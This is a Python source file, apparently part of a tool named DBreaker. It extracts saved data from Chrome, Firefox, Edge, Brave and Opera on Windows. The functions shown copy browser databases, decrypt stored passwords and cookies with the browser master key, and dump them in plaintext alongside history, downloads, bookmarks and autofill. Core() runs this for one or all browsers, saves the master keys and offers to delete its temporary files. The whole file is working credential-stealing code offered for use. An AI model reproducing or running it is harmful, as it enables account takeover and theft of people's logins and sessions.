        for url,username,en_password in cursor.fetchall():
            de_password=decrypt_value_all_version(en_password,master_key)
            if len(username) > 0:
                data="URL: "+url+"\nUsername: "+username+"\nPassword: "+de_password+"\n"+"-"*50+"\n"
                with open('Results/Brave/Brave_Login.txt','a',encoding='utf-8') as f:f.write(data)
                i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Login:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the logins of Brave !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Login:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Brave Logins  ! ");pass

def Brave_cookies(main_db4,master_key):
    try:
        i=0
        shutil.copy2(main_db4+r'\Network\Cookies',"Temp/Brave_Cookies.db")
        conn=sqlite3.connect("Temp/Brave_Cookies.db");conn.text_factory=bytes;cursor=conn.cursor()
        cursor.execute("select host_key,name,encrypted_value from cookies;")
        for host,name,en_cookies in cursor.fetchall():
            de_cookies=decrypt_value_all_version(en_cookies,master_key)
            name=re.findall("b'(.*?)'",str(name))[0];host=re.findall("b'(.*?)'",str(host))[0]
            data=f"Host: {str(host)}\nName: {str(name)}\nCookie: {str(de_cookies)}"+"\n"+"-"*50+"\n"
            with open('Results/Brave/Brave_Cookies.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Cookies:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Cookies of Brave !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Cookies:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Brave Cookies  ! ");pass
    
def Brave_History(main_db4):
    try:
        i=0
        shutil.copy2(main_db4+'\History',"Temp/Brave_History.db")
        conn=sqlite3.connect("Temp/Brave_History.db");cursor=conn.cursor()
        cursor.execute("SELECT url,title FROM urls;")
        for url,title in cursor.fetchall():
            data="Title: "+title+"\nURL: "+url+"\n"+"-"*50+"\n"
            with open('Results/Brave/Brave_History.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave History:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the history of Brave !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave History:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Brave history  ! ");pass
    
def Brave_Downloads(main_db4):
    try:
        i=0
        shutil.copy2(main_db4+'\History',"Temp/Brave_Downloads.db")
        conn=sqlite3.connect("Temp/Brave_Downloads.db");cursor=conn.cursor()
        cursor.execute("SELECT target_path, tab_url FROM downloads;")
        for target_path,tap_url in cursor.fetchall():
            data="URL: "+tap_url+"\nPath: "+target_path+"\n"+"-"*50+"\n" 
            with open('Results/Brave/Brave_Downloads.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Downloads:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Downloads of Brave !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Downloads:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Brave Downloads  ! ");pass
    
def Brave_Bookmarks(main_db4):
    try:
        t=0
        shutil.copy2(main_db4+'\Bookmarks',"Temp/Brave_Bookmarks.json")
        with open("Temp/Brave_Bookmarks.json",'r',encoding="utf-8") as f:
            json_data=f.read()
            name=re.findall("\"name\": \"(.*?)\",([\s\S]*?)\"type\": \"url\"",json_data, re.S)
            url=re.findall("\"url\": \"(.*?)\"",json_data, re.S)
            for i in range(0,len(url)):
                data="Name: "+name[i][0]+"\nURL: "+url[i]+"\n"+"-"*50+"\n" 
                with open('Results/Brave/Brave_Bookmarks.txt','a',encoding="utf-8") as f:f.write(data)
                t+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Bookmarks:{t}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the bookmarks of Brave !")
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Bookmarks:{t}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Brave bookmarks  ! ",e);pass
    
def Brave_Autofill(main_db4):
    try:
        i=0
        shutil.copy2(main_db4+'\Web Data',"Temp/Brave_Autofill.db")
        conn=sqlite3.connect("Temp/Brave_Autofill.db");cursor=conn.cursor()
        cursor.execute("SELECT name, value FROM autofill;")
        for name,value in cursor.fetchall():
            data="Name: "+name+"\nValue: "+value+"\n"+"-"*50+"\n" 
            with open('Results/Brave/Brave_Autofill.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Autofill:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Autofill data of Brave !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Autofill:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Brave Autofill data  ! ");pass


def Opera_Login(main_db5,master_key):
    try:
        i=0
        shutil.copy2(main_db5+'Login Data',"Temp/Opera_Login.db")
        conn=sqlite3.connect("Temp/Opera_Login.db");cursor=conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url,username,en_password in cursor.fetchall():
            de_password=decrypt_value_all_version(en_password,master_key)
            if len(username) > 0:
                data="URL: "+url+"\nUsername: "+username+"\nPassword: "+de_password+"\n"+"-"*50+"\n"
                with open('Results/Opera/Opera_Login.txt','a',encoding='utf-8') as f:f.write(data)
                i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Login:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the logins of Opera !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Login:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Opera Logins  ! ");pass

def Opera_cookies(main_db5,master_key):
    try:
        i=0
        shutil.copy2(main_db5+r'\Network\Cookies',"Temp/Opera_Cookies.db")
        conn=sqlite3.connect("Temp/Opera_Cookies.db");conn.text_factory=bytes;cursor=conn.cursor()
        cursor.execute("select host_key,name,encrypted_value from cookies;")
        for host,name,en_cookies in cursor.fetchall():
            de_cookies=decrypt_value_all_version(en_cookies,master_key)
            name=re.findall("b'(.*?)'",str(name))[0];host=re.findall("b'(.*?)'",str(host))[0]
            data=f"Host: {str(host)}\nName: {str(name)}\nCookie: {str(de_cookies)}"+"\n"+"-"*50+"\n"
            with open('Results/Opera/Opera_Cookies.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Cookies:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Cookies of Opera !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Cookies:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Opera Cookies  ! ");pass
    
def Opera_History(main_db5):
    try:
        i=0
        shutil.copy2(main_db5+'\History',"Temp/Opera_History.db")
        conn=sqlite3.connect("Temp/Opera_History.db");cursor=conn.cursor()
        cursor.execute("SELECT url,title FROM urls;")
        for url,title in cursor.fetchall():
            data="Title: "+title+"\nURL: "+url+"\n"+"-"*50+"\n"
            with open('Results/Opera/Opera_History.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera History:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the history of Opera !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera History:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Opera history  ! ");pass
    
def Opera_Downloads(main_db5):
    try:
        i=0
        shutil.copy2(main_db5+'\History',"Temp/Opera_Downloads.db")
        conn=sqlite3.connect("Temp/Opera_Downloads.db");cursor=conn.cursor()
        cursor.execute("SELECT target_path, tab_url FROM downloads;")
        for target_path,tap_url in cursor.fetchall():
            data="URL: "+tap_url+"\nPath: "+target_path+"\n"+"-"*50+"\n" 
            with open('Results/Opera/Opera_Downloads.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Downloads:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Downloads of Opera !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Brave Downloads:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Brave Downloads  ! ");pass
    
def Opera_Bookmarks(main_db5):
    try:
        t=0
        shutil.copy2(main_db5+'\Bookmarks',"Temp/Opera_Bookmarks.json")
        with open("Temp/Opera_Bookmarks.json",'r',encoding="utf-8") as f:
            json_data=f.read()
            name=re.findall("\"name\": \"(.*?)\",([\s\S]*?)\"type\": \"url\"",json_data, re.S)
            url=re.findall("\"url\": \"(.*?)\"",json_data, re.S)
            for i in range(0,len(url)):
                data="Name: "+name[i][0]+"\nURL: "+url[i]+"\n"+"-"*50+"\n" 
                with open('Results/Opera/Opera_Bookmarks.txt','a',encoding="utf-8") as f:f.write(data)
                t+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Bookmarks:{t}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the bookmarks of Opera !")
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Bookmarks:{t}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Opera bookmarks  ! ",e);pass
    
def Opera_Autofill(main_db5):
    try:
        i=0
        shutil.copy2(main_db5+'\Web Data',"Temp/Opera_Autofill.db")
        conn=sqlite3.connect("Temp/Opera_Autofill.db");cursor=conn.cursor()
        cursor.execute("SELECT name, value FROM autofill;")
        for name,value in cursor.fetchall():
            data="Name: "+name+"\nValue: "+value+"\n"+"-"*50+"\n" 
            with open('Results/Opera/Opera_Autofill.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Autofill:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Autofill data of Opera !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Opera Autofill:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Opera Autofill data  ! ");pass
        
        
def Temp_Remover():
    try:
        i=0;console.print('\n')
        path=os.environ['USERPROFILE']+'\Temp'
        for file in os.listdir(path):
            sleep(0.2)
            console.log(f' -- {file} Has been Removed ! ')
            os.remove(path+"/"+file)
            i+=1
        sleep(0.2)
        console.log(f' -- {path} Has been Removed ! ')
        os.removedirs(path)
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Temp Files Clean up:{i}:✅\n')
        click.secho('[!] Completed successfully !', fg='green') 
    except PermissionError:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Temp Files Clean up:{i}:❌\n');pass
    except FileNotFoundError:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Temp Files Clean up:{i}:❌\n');pass
        
def Old_ResultRemover():
    try:
        path=os.environ['USERPROFILE']+'\Results'
        if not os.listdir(path):
            pass
        else:
            i=0;console.print("\n[-] Old Files were Detected in The Results File, Removal is in Progress ..",style='error')
            if not os.path.exists("Results/Google Chrome"):pass
            else:
                console.print('\n')
                for file in os.listdir(path+"\Google Chrome"):
                    sleep(0.2)
                    console.log(f' -- {file} Has been Removed ! ')
                    os.remove(path+"\Google Chrome"+"/"+file)
                    i+=1
                sleep(0.2)
            if not os.path.exists("Results/Mozilla Firefox"):pass
            else:
                console.print('\n')
                for file in os.listdir(path+"\Mozilla Firefox"):
                    sleep(0.2)
                    console.log(f' -- {file} Has been Removed ! ')
                    os.remove(path+"\Mozilla Firefox"+"/"+file)
                    i+=1
                sleep(0.2)
            if not os.path.exists("Results/Microsoft Edge"):pass
            else:
                console.print('\n')
                for file in os.listdir(path+"\Microsoft Edge"):
                    sleep(0.2)
                    console.log(f' -- {file} Has been Removed ! ')
                    os.remove(path+"\Microsoft Edge"+"/"+file)
                    i+=1
                sleep(0.2)
            if not os.path.exists("Results/Brave"):pass
            else:
                console.print('\n')
                for file in os.listdir(path+"\Brave"):
                    sleep(0.2)
                    console.log(f' -- {file} Has been Removed ! ')
                    os.remove(path+"\Brave"+"/"+file)
                    i+=1
                sleep(0.2)
            if not os.path.exists("Results/Opera"):pass
            else:
                console.print('\n')
                for file in os.listdir(path+"\Opera"):
                    sleep(0.2)
                    console.log(f' -- {file} Has been Removed ! ')
                    os.remove(path+"\Opera"+"/"+file)
                    i+=1
                sleep(0.2)
            with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Old Results Files Clean up:{i}:✅\n')
    except PermissionError:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Old Results Files Clean up:{i}:❌\n');pass
    except FileNotFoundError:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Old Results Files Clean up:{i}:❌\n');pass
    Main()

def Result():
    Main();banner()
    console.print("[bold magenta]Results [/bold magenta]!", "💻")
    table=Table(show_header=True, header_style="bold blue")
    table.add_column("ID", style="dim",width=6)
    table.add_column("Operation",min_width=20)
    table.add_column("Count",min_width=12,justify="right")
    table.add_column("Status",min_width=12,justify="right")
    for id,operation in enumerate(open('Results/Results.txt','r',encoding="utf-8").read().splitlines(),start=1):
        operations=operation.split(":")[0]
        count=operation.split(":")[1]
        status=operation.split(":")[2]
        table.add_row(f'{id}',f'[error]{operations}[/error]',f"[bold Yellow]{count}[/bold Yellow]",f'[bold green]{status}[/bold green]')
    console.print(table);console.print('- Done in: {[bold green] '+f'{str(localtime().tm_hour)+":"+str(localtime().tm_min)+":"+str(localtime().tm_sec)+":"+str(localtime().tm_year)+":"+str(localtime().tm_mon)+":"+str(localtime().tm_mday)}'+' [/bold green]}\n');console.print('- Output in: {[bold green] '+os.getcwd()+r"\Results"+"[/bold green] }\n")
    try:os.remove('Results/Results.txt')
    except:pass
        
def Core():
    Main();banner();sleep(1.5);Main()
    console.print("[error]Settings [/error]!", "💻");table=Table(show_header=True,header_style="bold dim");table.add_column("ID", style="dim",width=6);table.add_column("Browser",style='bold blue',min_width=20);table.add_row('1','Google Chrome');table.add_row('2','Mozilla Firefox');table.add_row('3','Microsoft Edge');table.add_row('4','Brave');table.add_row('5','Opera');table.add_row('6','Select All');console.print(table)
    console.print('\n[?] Enter The Browser ID:',style='bold dim');bw=int(input())
    
    if not os.path.exists("Results/"):os.makedirs("Results/")
    if not os.path.exists("Temp/"):os.makedirs("Temp/")
    if os.path.exists('Results/Results.txt')==True:
        try:os.remove('Results/Results.txt')
        except:pass
    
    
    #Check for old files    
    Old_ResultRemover()
    
    
    LOCAL_PATH={
        "CHROME_LOCALSTATE_PATH" : r"AppData\Local\Google\Chrome\User Data\Local State",
        "EDGE_LOCALSTATE_PATH" : r"AppData\Local\Microsoft\Edge\User Data\Local State",
        "BRAVE_LOCALSTATE_PATH" : r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
        "OPERA_LOCALSTATE_PATH" : r'AppData\Roaming\Opera Software\Opera Stable\Local State'}
    if bw==1:
        #Google Chrome
        if not os.path.exists("Results/Google Chrome"):os.makedirs("Results/Google Chrome")
        master_key=get_master_key(LOCAL_PATH["CHROME_LOCALSTATE_PATH"]);main_db=os.environ['USERPROFILE']+os.sep+r'AppData\Local\Google\Chrome\User Data\default\\'
        with open('Results/Google Chrome/Chrome_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key))
        Chrome_Login(main_db,master_key)
        Chrome_cookies(main_db,master_key)
        Chrome_TS(main_db,master_key)
        Chrome_History(main_db)
        Chrome_Downloads(main_db)
        Chrome_Bookmarks(main_db)
        Chrome_Autofill(main_db)
    elif bw==2:
        #Mozilla Firefox
        if not os.path.exists("Results/Mozilla Firefox"):os.makedirs("Results/Mozilla Firefox")
        temp_db=os.getenv('APPDATA')+"\\Mozilla\\Firefox\\Profiles\\"
        for name in os.listdir(temp_db):main_db2=temp_db+name
        Firefox_Login()
        Firefox_Cookies(main_db2)
        Firefox_History(main_db2)
        Firefox_Downloads(main_db2)
        Firefox_Bookmarks(main_db2)
        Firefox_lastsearch(main_db2)
    elif bw==3:
        #Micrsoft Edge
        if not os.path.exists("Results/Microsoft Edge"):os.makedirs("Results/Microsoft Edge")
        master_key=get_master_key(LOCAL_PATH["EDGE_LOCALSTATE_PATH"]);master_key_without_Byte=re.findall("b'(.*?)'",str(master_key))[0];main_db3=os.environ['USERPROFILE']+os.sep+r'AppData\Local\Microsoft\Edge\User Data\Default\\'
        with open('Results/Microsoft Edge/Edge_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key_without_Byte))
        Edge_Login(main_db3,master_key)
        Edge_cookies(main_db3,master_key)
        Edge_History(main_db3)
        Edge_Downloads(main_db3)
        Edge_Bookmarks(main_db3)
        Edge_Autofill(main_db3)
    elif bw==4:
        #Brave
        if not os.path.exists("Results/Brave"):os.makedirs("Results/Brave")
        master_key=get_master_key(LOCAL_PATH["BRAVE_LOCALSTATE_PATH"]);master_key_without_Byte=re.findall("b'(.*?)'",str(master_key))[0];main_db4=os.environ['USERPROFILE']+os.sep+r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\\'
        with open('Results/Brave/Brave_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key_without_Byte))
        Brave_Login(main_db4,master_key)
        Brave_cookies(main_db4,master_key)
        Brave_History(main_db4)
        Brave_Downloads(main_db4)
        Brave_Bookmarks(main_db4)
        Brave_Autofill(main_db4)
    elif bw==5:
        #Opera
        if not os.path.exists("Results/Opera"):os.makedirs("Results/Opera")
        master_key=get_master_key(LOCAL_PATH["OPERA_LOCALSTATE_PATH"]);master_key_without_Byte=re.findall("b'(.*?)'",str(master_key))[0];main_db5=os.environ['USERPROFILE']+os.sep+r'AppData\Roaming\Opera Software\Opera Stable\\'
        with open('Results/Opera/Opera_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key_without_Byte))
        Opera_Login(main_db5,master_key)
        Opera_cookies(main_db5,master_key)
        Opera_History(main_db5)
        Opera_Downloads(main_db5)
        Opera_Bookmarks(main_db5)
        Opera_Autofill(main_db5)
    elif bw==6:
        #Google Chrome
        if not os.path.exists("Results/Google Chrome"):os.makedirs("Results/Google Chrome")
        if not os.path.exists("Results/Mozilla Firefox"):os.makedirs("Results/Mozilla Firefox")
        if not os.path.exists("Results/Microsoft Edge"):os.makedirs("Results/Microsoft Edge")
        if not os.path.exists("Results/Brave"):os.makedirs("Results/Brave")
        if not os.path.exists("Results/Opera"):os.makedirs("Results/Opera")
        master_key=get_master_key(LOCAL_PATH["CHROME_LOCALSTATE_PATH"]);main_db=os.environ['USERPROFILE']+os.sep+r'AppData\Local\Google\Chrome\User Data\default\\'
        with open('Results/Google Chrome/Chrome_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key))
        Chrome_Login(main_db,master_key)
        Chrome_cookies(main_db,master_key)
        Chrome_TS(main_db,master_key)
        Chrome_History(main_db)
        Chrome_Downloads(main_db)
        Chrome_Bookmarks(main_db)
        Chrome_Autofill(main_db)
        #Mozilla Firefox
        temp_db=os.getenv('APPDATA')+"\\Mozilla\\Firefox\\Profiles\\"
        for name in os.listdir(temp_db):main_db2=temp_db+name
        Firefox_Login()
        Firefox_Cookies(main_db2)
        Firefox_History(main_db2)
        Firefox_Downloads(main_db2)
        Firefox_Bookmarks(main_db2)
        Firefox_lastsearch(main_db2)
        #Micrsoft Edge
        master_key=get_master_key(LOCAL_PATH["EDGE_LOCALSTATE_PATH"]);master_key_without_Byte=re.findall("b'(.*?)'",str(master_key))[0];main_db3=os.environ['USERPROFILE']+os.sep+r'AppData\Local\Microsoft\Edge\User Data\Default\\'
        with open('Results/Microsoft Edge/Edge_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key_without_Byte))
        Edge_Login(main_db3,master_key)
        Edge_cookies(main_db3,master_key)
        Edge_History(main_db3)
        Edge_Downloads(main_db3)
        Edge_Bookmarks(main_db3)
        Edge_Autofill(main_db3)
        #Brave
        master_key=get_master_key(LOCAL_PATH["BRAVE_LOCALSTATE_PATH"]);master_key_without_Byte=re.findall("b'(.*?)'",str(master_key))[0];main_db4=os.environ['USERPROFILE']+os.sep+r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\\'
        with open('Results/Brave/Brave_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key_without_Byte))
        Brave_Login(main_db4,master_key)
        Brave_cookies(main_db4,master_key)
        Brave_History(main_db4)
        Brave_Downloads(main_db4)
        Brave_Bookmarks(main_db4)
        Brave_Autofill(main_db4)
        #Opera
        master_key=get_master_key(LOCAL_PATH["OPERA_LOCALSTATE_PATH"]);master_key_without_Byte=re.findall("b'(.*?)'",str(master_key))[0];main_db5=os.environ['USERPROFILE']+os.sep+r'AppData\Roaming\Opera Software\Opera Stable\\'
        with open('Results/Opera/Opera_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key_without_Byte))
        Opera_Login(main_db5,master_key)
        Opera_cookies(main_db5,master_key)
        Opera_History(main_db5)
        Opera_Downloads(main_db5)
        Opera_Bookmarks(main_db5)
        Opera_Autofill(main_db5)
        
        
        
    #End , clean up print the result and close
    sleep(2);Main()
    console.print("[+] Done, Do you want to clean Temporary Files",":coffee:",justify='left',style='bold green')
    if click.confirm('',default=True,show_default=True):Temp_Remover()
    sleep(2);Result()
    
    
    
    
    
Core()
